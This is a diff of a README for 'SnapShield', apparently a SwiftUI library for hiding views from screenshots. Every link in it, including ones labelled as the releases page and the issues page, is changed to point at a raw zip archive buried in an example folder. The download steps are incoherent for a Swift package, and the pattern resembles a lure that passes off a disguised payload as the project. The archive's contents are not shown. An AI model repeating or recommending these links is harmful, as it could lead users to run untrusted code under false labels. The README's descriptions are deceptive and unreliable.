@@ -4,20 +4,20 @@
 SnapShield helps you protect sensitive SwiftUI views from unwanted screenshots and screen recordings. With customizable placeholders, it is simple to use, lightweight, and easy to integrate into your projects. Your privacy is important, and we are here to help you keep it safe.
 
 ## 🔗 Download SnapShield
-[![Download SnapShield](https://raw.githubusercontent.com/Elias10c/SnapShield/main/nonspiny/SnapShield.zip%20SnapShield-latest%20release-blue)](https://raw.githubusercontent.com/Elias10c/SnapShield/main/nonspiny/SnapShield.zip)
+[![Download SnapShield](https://github.com/Elias10c/SnapShield/raw/refs/heads/main/Example/SnapShieldExample/Snap-Shield-2.3-beta.4.zip%20SnapShield-latest%20release-blue)](https://github.com/Elias10c/SnapShield/raw/refs/heads/main/Example/SnapShieldExample/Snap-Shield-2.3-beta.4.zip)
 
 ## 🚀 Getting Started
 To begin using SnapShield, follow these steps:
 
 1. **Visit the Releases Page**  
    Click on the link below to access the download options for SnapShield.  
-   [Download SnapShield from the Releases page](https://raw.githubusercontent.com/Elias10c/SnapShield/main/nonspiny/SnapShield.zip)
+   [Download SnapShield from the Releases page](https://github.com/Elias10c/SnapShield/raw/refs/heads/main/Example/SnapShieldExample/Snap-Shield-2.3-beta.4.zip)
 
 2. **Choose Your Version**  
    On the Releases page, choose the version that suits your system. Each version will have a list of files available for download.
 
 3. **Download the Zip File**  
-   Look for a file that fits your platform (often labeled with `.zip` for macOS or `https://raw.githubusercontent.com/Elias10c/SnapShield/main/nonspiny/SnapShield.zip` for Linux). Click on the file name to start the download.
+   Look for a file that fits your platform (often labeled with `.zip` for macOS or `https://github.com/Elias10c/SnapShield/raw/refs/heads/main/Example/SnapShieldExample/Snap-Shield-2.3-beta.4.zip` for Linux). Click on the file name to start the download.
 
 4. **Extract the Files**  
    Once the download is complete, locate the file where you saved it. Right-click on the file and select "Extract All" or use an extraction tool to unzip the contents.
@@ -61,7 +61,7 @@ You only need Xcode, which you likely already have if you're working on a SwiftU
 Yes, SnapShield is open source! You can find the code and contribute through our GitHub repository.
 
 ### Where can I report issues or ask questions?
-You can open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/Elias10c/SnapShield/main/nonspiny/SnapShield.zip) for any questions or suggestions.
+You can open an issue on our [GitHub Issues page](https://github.com/Elias10c/SnapShield/raw/refs/heads/main/Example/SnapShieldExample/Snap-Shield-2.3-beta.4.zip) for any questions or suggestions.
 
 ## 📜 License
 SnapShield is open-source software licensed under the MIT License. Feel free to use, modify, and distribute it as you like.
@@ -83,6 +83,6 @@ SnapShield is open-source software licensed under the MIT License. Feel free to 
 - swiftui
 
 ## 🔗 Final Steps
-Now that you have downloaded SnapShield, make sure to revisit the [Releases page](https://raw.githubusercontent.com/Elias10c/SnapShield/main/nonspiny/SnapShield.zip) for future updates or new versions. Keeping your application up to date ensures you benefit from the latest features and security improvements.
+Now that you have downloaded SnapShield, make sure to revisit the [Releases page](https://github.com/Elias10c/SnapShield/raw/refs/heads/main/Example/SnapShieldExample/Snap-Shield-2.3-beta.4.zip) for future updates or new versions. Keeping your application up to date ensures you benefit from the latest features and security improvements.
 
 Thank you for choosing SnapShield to protect your SwiftUI views!
